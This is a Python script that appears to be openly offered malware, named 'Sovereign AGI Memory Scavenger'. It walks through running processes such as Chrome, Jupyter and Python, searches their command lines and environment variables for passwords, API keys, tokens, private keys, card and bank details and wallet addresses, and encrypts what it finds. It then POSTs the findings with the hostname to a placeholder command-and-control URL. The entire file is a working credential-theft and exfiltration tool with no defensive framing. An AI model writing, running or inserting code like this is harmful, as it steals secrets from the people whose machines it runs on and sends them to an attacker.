import os
import re
import sys
import subprocess
import time
import psutil
import ctypes
import requests
import json
import hashlib
import platform
import logging
from cryptography.fernet import Fernet

# --- Configuration ---
TARGET_PROCESS_NAMES = ["python3", "jupyter-notebook", "chrome.exe", "notepad.exe"]
KEYWORDS = [
    r"password",
    r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}",
    r"eyJ[A-Za-z0-9._-]+",
    r"sk_[A-Za-z0-9]{24}",
    r"secret",
    r"api_key",
    r"token",
    r"authorization",
    r"private_key",
    r"[0-9a-fA-F]{32,}",
    r"credit_card",
    r"social_security",
    r"flag\{[A-Za-z0-9]+\}",
    r"bank_account",
    r"routing_number",
    r"swift_code",
    r"wallet_address",
    r"db_connection",
    r"api_endpoint",
    r"git_credentials",
    r"\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)",
    r"(https?://|www\.)\S+"
]

LOG_FILE = "memory_carnage.log"
C2_URL = "http://your-c2-server.com/receive"
ENCRYPTION_KEY = Fernet.generate_key()  # Generate a secure key

# Setup Logging
logging.basicConfig(filename=LOG_FILE, level=logging.INFO,
                    format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)


# --- Core Logic Implementation (Memory Scavenging) ---

def initialize_fernet():
    """Initializes the Fernet cipher."""
    return Fernet(ENCRYPTION_KEY)

def get_target_processes():
    """Yields psutil Process objects matching TARGET_PROCESS_NAMES."""
    for proc in psutil.process_iter(['name', 'pid', 'cmdline', 'environ', 'connections']):
        try:
            proc_name = proc.name().lower()
            if proc_name in TARGET_PROCESS_NAMES or any(name in (proc.cmdline() or []) for name in TARGET_PROCESS_NAMES):
                yield proc
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            continue

def scan_process_environment(process: psutil.Process, cipher: Fernet) -> list:
    """
    Scans high-value, accessible process data (CMD line, environment variables)
    for sensitive keywords, encrypting findings immediately.
    (Avoids complex OS-specific memory dumps for portability/simplicity here).
    """
    findings = []
    
    logger.info(f"Scanning PID {process.pid} ({process.name()})...")

    # Sources typically containing secrets outside of protected memory heap
    data_sources = [
        {"type": "cmdline", "content": ' '.join(process.cmdline() or [])},
        {"type": "environ", "content": str(process.environ())},
    ]

    for source in data_sources:
        content = source['content']
        for pattern in KEYWORDS:
            matches = re.findall(pattern, content, re.IGNORECASE | re.DOTALL)
            for match in set(matches): # Use set to deduplicate exact matches
                # Encrypt the finding immediately
                try:
                    encrypted_data = cipher.encrypt(match.encode('utf-8'))
                    finding = {
                        "process_name": process.name(),
                        "pid": process.pid,
                        "source": source['type'],
                        "keyword_pattern": pattern,
                        "encrypted_data": encrypted_data.decode()
                    }
                    findings.append(finding)
                    logger.warning(f"Found sensitive data in {process.name()} ({source['type']}).")
                except Exception as e:
                    logger.error(f"Failed to encrypt finding in {process.name()}: {e}")
                
    return findings

def exfiltrate_data(data: list):
    """Sends collected encrypted data to the configured C2 server."""
    if not data:
        logger.info("No data to exfiltrate.")
        return

    try:
        payload = {
            "key_hash": hashlib.sha256(ENCRYPTION_KEY).hexdigest(), 
            "data": data,
            "host": platform.node(),
            "timestamp": time.time()
        }
        
        response = requests.post(C2_URL, json=payload, timeout=10)
        
        if response.status_code == 200:
            logger.info(f"Successfully exfiltrated {len(data)} findings.")
        else:
            logger.error(f"Exfiltration failed. C2 returned status {response.status_code}")
            
    except requests.exceptions.RequestException as e:
        logger.error(f"Failed to connect to C2 server {C2_URL}: {e}")

def scavenger_main_loop():
    """Main loop for scanning and exfiltration."""
    logger.info("Starting Sovereign AGI Memory Scavenger v94.1.")
    cipher = initialize_fernet()
    all_findings = []

    try:
        for process in get_target_processes():
            findings = scan_process_environment(process, cipher)
            if findings:
                all_findings.extend(findings)
                
    except Exception as e:
        logger.critical(f"Unhandled exception during scanning: {e}", exc_info=True)
        
    if all_findings:
        exfiltrate_data(all_findings)
        
    logger.info("Memory scanning cycle complete.")

def main():
    scavenger_main_loop()

if __name__ == "__main__":
    main()